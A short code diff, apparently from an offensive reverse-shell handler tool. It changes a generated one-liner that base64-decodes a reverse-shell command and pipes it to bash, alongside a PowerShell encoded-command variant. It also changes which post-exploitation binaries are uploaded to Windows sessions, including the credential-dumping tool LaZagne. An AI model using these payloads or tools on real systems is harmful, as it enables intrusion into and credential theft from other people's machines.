@@ -1689,7 +1689,7 @@ class Listener:
 			output.append(presets[0].format(ip, self.port))
 			output.append("")
 			rev_shell_b64 = base64.b64encode(presets[0].format(ip, self.port).encode()).decode()
-			output.append(f'echo {rev_shell_b64} | base64 -d | bash -i')
+			output.append(f'echo {rev_shell_b64} | base64 -d | bash')
 			output.append("")
 			output.append("cmd /c powershell -e " + base64.b64encode(presets[1].format(ip, self.port).encode("utf-16le")).decode())
 
@@ -3641,7 +3641,7 @@ class privesc(Module):
 			self.session.upload(BINARIES['deepce'])
 		elif self.session.OS == 'Windows':
 			self.session.upload(BINARIES['winpeas'])
-			self.session.upload(BINARIES['powerup'])
+			#self.session.upload(BINARIES['powerup'])
 			self.session.upload(BINARIES['sharpup'])
 			self.session.upload(BINARIES['lazagne'])
 			self.session.upload(BINARIES['powerview'])
